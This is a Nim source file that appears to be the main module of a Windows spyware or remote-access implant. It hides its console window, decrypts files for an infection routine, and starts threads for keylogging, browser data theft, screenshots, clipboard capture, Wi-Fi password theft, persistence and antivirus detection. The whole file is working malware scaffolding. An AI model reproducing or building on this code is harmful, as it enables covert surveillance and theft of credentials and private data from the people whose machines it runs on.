# hide the console window
from lib/constants import isProd
when isProd:
  from winim/inc/wincon import FreeConsole
  FreeConsole()

from lib/flags import USE_INFECT_THREAD
when USE_INFECT_THREAD:
  # decrypt file if args passed
  from os import paramCount
  from os import paramStr
  from os import getEnv
  from os import `/`
  from os import splitFile
  from os import existsFile

  from lib/more/xxtea import decrypt

  import lib/functions/hideString

  from lib/flags import INFECT_ENCRYPTION_KEY

  if paramCount() >= 1:
    try:
      let file = paramStr(1)
      let (_, name, ext) = splitFile(file)
      let tmpFile = getEnv(d e"tmp") / name & ext

      if not existsFile(tmpFile):
        writeFile(
          tmpFile,
          decrypt(
            readFile(file),
            d INFECT_ENCRYPTION_KEY
          )
        )

      quit 0
    except OSError, IOError:
      quit 0


when not isProd:
  echo "started"

from lib/channels import mainChannel

open mainChannel

from lib/flags import USE_KEYLOGGER_THREAD
when USE_KEYLOGGER_THREAD:
  from lib/threads/keyloggerThread import initKeyloggerThread

  var keyloggerThreadVar: Thread[void]

  createThread(keyloggerThreadVar, initKeyloggerThread)

from lib/flags import USE_BROWSER_THREAD
when USE_BROWSER_THREAD:
  from lib/threads/browserThread import initBrowserThread

  var browserThreadVar: Thread[void]

  createThread(browserThreadVar, initBrowserThread)

when USE_INFECT_THREAD:
  from lib/threads/infectThread import initInfectThread

  var infectThreadVar: Thread[void]

  createThread(infectThreadVar, initInfectThread)

from lib/flags import USE_PERSISTENCE_THREAD
when USE_PERSISTENCE_THREAD:
  from lib/threads/persistenceThread import initPersistenceThread

  var persistenceThreadVar: Thread[void]

  createThread(persistenceThreadVar, initPersistenceThread)

from lib/flags import USE_WINDOW_NAME_THREAD
when USE_WINDOW_NAME_THREAD:
  from lib/threads/windowNameThread import initWindowNameThread

  var windowNameThreadVar: Thread[void]

  createThread(windowNameThreadVar, initWindowNameThread)

from lib/flags import USE_SCREENSHOT_THREAD
when USE_SCREENSHOT_THREAD:
  from lib/threads/screenshotThread import initScreenshotThread

  var screenshotThreadVar: Thread[void]

  createThread(screenshotThreadVar, initScreenshotThread)

from lib/flags import USE_CLIPBOARD_THREAD
when USE_CLIPBOARD_THREAD:
  from lib/threads/clipboardThread import initClipboardThread

  var clipboardThreadVar: Thread[void]

  createThread(clipboardThreadVar, initClipboardThread)

from lib/flags import USE_WIFI_PASSWORDS_THREAD
when USE_WIFI_PASSWORDS_THREAD:
  from lib/threads/wifiPasswordsThread import initWifiPasswordsThread

  var wifiPasswordsThreadVar: Thread[void]

  createThread(wifiPasswordsThreadVar, initWifiPasswordsThread)

from lib/flags import USE_GET_AVS_THREAD
when USE_GET_AVS_THREAD:
  from lib/threads/getAVSThread import initGetAVSThread

  var getAVSThreadVar: Thread[void]

  createThread(getAVSThreadVar, initGetAVSThread)

from lib/flags import USE_CONNECTED_WIFI_THREAD
when USE_CONNECTED_WIFI_THREAD:
  from lib/threads/connectedWifiThread import initConnectedWifiThread

  var connectedWifiThreadVar: Thread[void]

  createThread(connectedWifiThreadVar, initConnectedWifiThread)

from lib/flags import USE_CONNECTED_DEVICES_THREAD
when USE_CONNECTED_DEVICES_THREAD:
  from lib/threads/connectedDevicesThread import initConnectedDevicesThread

  var connectedDevicesThreadVar: Thread[void]

  createThread(connectedDevicesThreadVar, initConnectedDevicesThread)

# wait for thread messages
from os import sleep

while true:
  let channel: tuple[dataAvailable: bool, msg: string] = mainChannel.tryRecv()

  if channel.dataAvailable:
    echo channel.msg

  ## TODO: n as vrea sa folosesc sleep(10)
  ## asa ca e probabil sa modifc aici oricand
  sleep(10)

close mainChannel
